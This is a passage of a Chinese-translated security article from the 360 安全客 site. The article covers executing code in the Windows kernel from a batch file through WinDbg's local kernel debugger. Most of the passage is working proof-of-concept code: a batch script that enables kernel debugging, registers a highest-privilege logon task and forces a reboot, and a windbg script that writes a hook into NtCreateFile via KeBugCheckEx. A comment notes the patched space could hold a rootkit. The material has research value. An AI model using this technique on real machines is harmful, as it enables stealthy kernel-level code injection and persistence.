+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span>
+</p>
+<pre class="brush:ps;toolbar:false">IF [%1]==[/DOONLOGON] GOTO ONLOGON
+bcdedit /debug on
+bcdedit /dbgsettings local
+schtasks /create /sc onlogon /tn setup /rl highest /tr &quot;%0 /DOONLOGON&quot;
+shutdown /r /f
+GOTO DONE
+:ONLOGON
+rem here local debugging is enabled and we run as administrator
+:DONE</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">您可以看到脚本是如何启用本地内核调试的，它会安装一个在重新启动后将要执行的任务，并重新启动计算机。</span>
+</p>
+<p>
+    <br/>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4）使用windbg修补内核内存，以内核模式注入和执行我们的代码</span></strong></span>
+</p>
+<hr/>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过前面部分中介绍的方法，我们已经将所有需要的文件转储到了磁盘，并且已经可以让UAC提示用户获取管理员权限，同时我们也启用了内核本地调试。接下来的最后一步，是修补Windows内核内存，将我们的代码放到内核中，并在内核中挂接一些函数来执行我们的代码。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为此，我们将使用-kl选项（内核本地调试）和-c选项启动windbg，以启动我们的windbg脚本：&nbsp;</span>
+</p>
+<pre class="brush:ps;toolbar:false">start /min windbg -y &quot;SRV*c:\symbols*http://msdl.microsoft.com/download/symbols&quot; -c&quot;$$&gt;&lt;jmpkernel_hookcreatefile.wdbg;q&quot; -kl</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">而最重要的部分是windbg脚本<strong>jmpkernel_hookcreatefile.wdbg</strong>。您可以在下一段看到该脚本中的相关代码。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这个脚本中，一些地址是我的目标测试机器，这里使用了硬编码方式。目标机器是Windows 8.1 Pro N x64，ntoskrnl版本为6.3.9600.17668。当然，要想适应其他机器，或编写没有硬编码地址的通用脚本也并非难事。无论如何，由于这只是一个PoC，所以我用一些硬编码的地址来完成测试，以防止代码变得过于复杂。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对于这个脚本，重点在于，通过windbg本地调试器修补内核内存的关键是使用物理地址来写内存。本地内核调试器不运行我们修改一些内核内存地址（例如，如果我们要修补NtCreateFile函数，它是不允许的）。然而，我们可以将目标虚拟地址转换为物理地址，并将我们的修改写入物理地址。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">将VA转换为物理地址的命令是!vtop。写入物理地址的命令是!eb。</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">此外，我们还得从批处理文件中转储windbg。当然，嵌入完整的windbg安装太过于疯狂。但是，我们这里只需要用到几个命令而已，所以我们只需要嵌入一个windbg二进制文件的子集就行了：&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span>
+</p>
+<pre class="brush:bash;toolbar:false">dbgeng.dll
+dbghelp.dll
+kdexts.dll
+kext.dll
+symsrv.dll
+symsrv.yes
+windbg.exe</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们将这些文件嵌入到批处理文件中，然后将它们一起转储到脚本文件中，最后使用脚本执行windbg。 执行脚本后，nt!NtCreateFile函数将被挂接。 我们已经使用nt！KeBugCheckEx的内存空间保存了自己的代码，为了调用我们存放在nt!KeBugCheckEx中的代码，可以挂接一个针对nt!NtCreateFile的调用。通过我们存放在nt!KeBugCheckEx中的代码，可以跳转到调用的原始目的地，所以函数被挂接，以便执行我们的代码，但系统不会出现任何问题。&nbsp;</span>
+</p>
+<pre class="brush:ps;toolbar:false">Jmpkernel_hookcreatefile.wdbg:
+.load kext.dll
+.load kdexts.dll
+.block
+{
+ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ $$ Get the Physical Adress of NtCreateFile
+ $$
+ $$ get the address of nt!NtCreateFile 
+ ? nt!NtCreateFile
+ $$ @$exp contains the address of NtCreateFile, so we create a alias for it
+ aS /x va @$exp
+ 
+ .block
+ {
+   $$ get the physical address of NtCreateFile
+   !vtop 0 va
+   $$ parse the results of vtop
+   r @$t1 = 0
+   .foreach (tok { !vtop 0 va })
+   { 
+     .catch 
+     { 
+       .printf &quot;tok&quot;
+       .printf &quot;\n&quot;
+       .if(@$t1==1)
+       { 
+         r @$t1 = ${tok}
+         .break
+       }
+ 
+       $$ in the results of vtop, when we find &quot;phys&quot; token, after it, it comes the physical address
+       .if($spat(&quot;${tok}&quot;,&quot;phys&quot;))
+       { 
+         r @$t1 = 1
+       }
+     }
+   }
+ } 
+ ad va
+ 
+ $$ after parsing vtop results we keep the physical address in @$t1, we create a alias
+ aS /x phaNtCreateFile @$t1
+ 
+ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ $$ Get the Physical Adress of KeBugCheckEx
+ $$
+ $$ get the address of nt!KeBugCheckEx 
+ ? nt!KeBugCheckEx
+ $$ @$exp contains the address of KeBugCheckEx, so we create a alias for it
+ aS /x va @$exp
+ 
+ .block
+ {
+   $$ get the physical address of KeBugCheckEx
+   !vtop 0 va
+   $$ parse the results of vtop
+   r @$t1 = 0
+   .foreach (tok { !vtop 0 va })
+   { 
+     .catch 
+     { 
+       .printf &quot;tok&quot;
+       .printf &quot;\n&quot;
+       .if(@$t1==1)
+       { 
+         r @$t1 = ${tok}
+         .break
+       }
+ 
+       $$ in the results of vtop, when we find &quot;phys&quot; token, after it, it comes the physical address
+       .if($spat(&quot;${tok}&quot;,&quot;phys&quot;))
+       { 
+         r @$t1 = 1
+       }
+     }
+   }
+ } 
+ ad va
+ 
+ $$ after parsing vtop results we keep the physical address in @$t1, we create a alias
+ aS /x phaKeBugCheckEx @$t1
+ 
+ 
+ $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ $$ Write our code to KeBugCheckEx (we will use the memory space of this function coz it wont be called unless
+ $$ the system crashes)
+ $$
+ 
+ .block
+ {
+   .printf &quot;nt!NtCreateFile physical address %p\n&quot;, phaNtCreateFile
+   .printf &quot;nt!NtKeyBugCheck physical address %p\n&quot;, phaKeBugCheckEx
+ 
+   $$ now we are going to write our code to KeBugCheckEx. It&#39;s only some simple nops operations for the PoC, 
+   $$ but we could find enough space to write an entire rootkit
+ 
+   !eb phaKeBugCheckEx 90 90 90 90 90 90 90 90 
+   $$ Now lets see the code of nt!NtCreateFile in the target system (win 8.1 x64 ntoskrnl version is 6.3.9600.17668)
+   $$
+   $$ nt!NtCreateFile:
+   $$ fffff803f846020 4c8bdc mov r11,rsp
+   $$ fffff803f846023 4881ec88000000 sub rsp,88h
+   $$ fffff803f84602a 33c0 xor eax,eax
+   $$ fffff803f84602c 498943f0 mov qword ptr [r11-10h],rax
+   $$ fffff803f846030 c744247020000000 mov dword ptr [rsp+70h],20h
+   $$ fffff803f846038 89442468 mov dword ptr [rsp+68h],eax
+   $$ fffff803f84603c 498943d8 mov qword ptr [r11-28h],rax
+   $$ fffff803f846040 89442458 mov dword ptr [rsp+58h],eax
+   $$ fffff803f846044 8b8424e0000000 mov eax,dword ptr [rsp+0E0h]
+   $$ fffff803f84604b 89442450 mov dword ptr [rsp+50h],eax
+   $$ fffff803f84604f 488b8424d8000000 mov rax,qword ptr [rsp+0D8h]
+   $$ fffff803f846057 498943c0 mov qword ptr [r11-40h],rax
+   $$ fffff803f84605b 8b8424d0000000 mov eax,dword ptr [rsp+0D0h]
+   $$ fffff803f846062 89442440 mov dword ptr [rsp+40h],eax
+   $$ fffff803f846066 8b8424c8000000 mov eax,dword ptr [rsp+0C8h]
+   $$ fffff803f84606d 89442438 mov dword ptr [rsp+38h],eax
+   $$ fffff803f846071 8b8424c0000000 mov eax,dword ptr [rsp+0C0h]
+   $$ fffff803f846078 89442430 mov dword ptr [rsp+30h],eax
+   $$ fffff803f84607c 8b8424b8000000 mov eax,dword ptr [rsp+0B8h]
+   $$ fffff803f846083 89442428 mov dword ptr [rsp+28h],eax
+   $$ fffff803f846087 488b8424b0000000 mov rax,qword ptr [rsp+0B0h]
+   $$ fffff803f84608f 49894398 mov qword ptr [r11-68h],rax
+   $$ fffff803f846093 e808000000 call nt!IopCreateFile (fffff803ef8460a0)  &lt;-------------------------
+ 
+   $$ to do it easier, we will hook the call to nt!IopCreateFile. This call is at nt!NtCreateFile + 0x73
+  
+   $$ in the code that we have written in KeBugCheck, we have to put a jmp to continue the execution 
+   $$ at nt!IopCreateFile (after the 90 90 90 90 90 90 90 90 that we wrote). Remember that E9 instruction 
+   $$ is a relative jump and the value that the instruction admits as parameter is the difference of: 
+   $$ target_address - (E9_ins_address+5).
+   $$ We need to have precalculated (nt!IopCreateFile)-(nt!KeBugCheckEx+8+5) = 0x002eb6f3 because !eb 
+   $$ needs that we pass immediate values
+ 
+   r $t1 = phaKeBugCheckEx
+   r $t1 = $t1 + 8
+   !eb $t1 E9 f3 b6 2e 00
+   $$ finally hook the call nt!IopCreateFile, it will be executed the next time that NtCreateFile was called and it
+   $$ will jmp to our code. We need precalculate the relative jump value: (nt!KeBugCheckEx-(nt!NtCreateFile+0x73+5)) = 0xffd14908
+   $$ because !eb needs we pass inmediate values (i have to research to avoid needing to have these values precalculated)
+ 
+   r $t1 = phaNtCreateFile
+   r $t1 = $t1 + 0x74
+   !eb $t1 08 49 d1 ff
+ }
+ ad *
+}</pre>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5）概念验证代码</span></strong></span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span>
+</p>
+<hr/>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里，我们已经通过前面部分中介绍的所有方法创建了一个概念验证代码。您可以通过下面的链接下载概念验证代码和相应的二进制文件：</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://github.com/vallejocc/patch_kernel_from_batch">https://github.com/vallejocc/patch_kernel_from_batch</a>&nbsp;</span>
+</p>
+<p style="text-indent: 2em;">
+    <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">您可以通过下面的视频来观看概念验证代码的运行情况：</span>
+</p>
+<p style="text-align: center; text-indent: 0em;">
+    <iframe class="iframe_auto_size" src="http://player.youku.com/embed/XMzA0NzgzMDM0OA==" frameborder="0" allowfullscreen=""></iframe>
+</p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://vallejo.cc/2015/06/07/batch-attach-and-patch-using-windbgs-local-kernel-debugger-to-execute-code-in-windows-kernel/" target="_blank">原文链接：https://vallejo.cc/2015/06/07/batch-attach-and-patch-using-windbgs-local-kernel-debugger-to-execute-code-in-windows-kernel/</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】利用WinDbg本地内核调试器攻陷 Windows 内核 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="4477" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="e1e87c549d98349eb21e125dcd9d9ecb">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/7x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="243389961" class="response" data-bind-id="243389961" data-target="16846" user-name="琪琪娟" href="javascript:;">
+                琪琪娟            </a>
+                        <span class="comment-time">2017-09-26 17:35:58</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="243389961" data-target="16846">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16846" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">来个蓝屏快捷键也算攻陷哈哈</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/8x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="16845" user-name="最最和谐" href="javascript:;">
+                最最和谐            </a>
+                        <span class="comment-time">2017-09-26 17:32:34</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="16845">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_16845" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">都有开内核调试器权限了，这系统还用攻陷吗</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="4477" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4467.html" alt="【漏洞预警】SambaBleed：Samba信息泄露漏洞（CVE–2017–12163）预警" target="_blank">【漏洞预警】SambaBleed：Sa...</a></li>
+                                <li><a href="/learning/detail/4473.html" alt="【技术分享】看我如何利用企业邮箱搞定上百企业内网或内部账号" target="_blank">【技术分享】看我如何利用企业邮箱搞...</a></li>
+                                <li><a href="/learning/detail/4463.html" alt="【技术分享】利用DLL延迟加载实现远程代码注入 " target="_blank">【技术分享】利用DLL延迟加载实现...</a></li>
+                                <li><a href="/learning/detail/4481.html" alt="【技术分享】Linux应急响应姿势浅谈" target="_blank">【技术分享】Linux应急响应姿势浅谈</a></li>
+                                <li><a href="/learning/detail/4469.html" alt="【知识】9月24日 - 每日安全知识热点" target="_blank">【知识】9月24日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4472.html" alt="【技术分享】针对联网智能灯泡的安全性分析" target="_blank">【技术分享】针对联网智能灯泡的安全...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
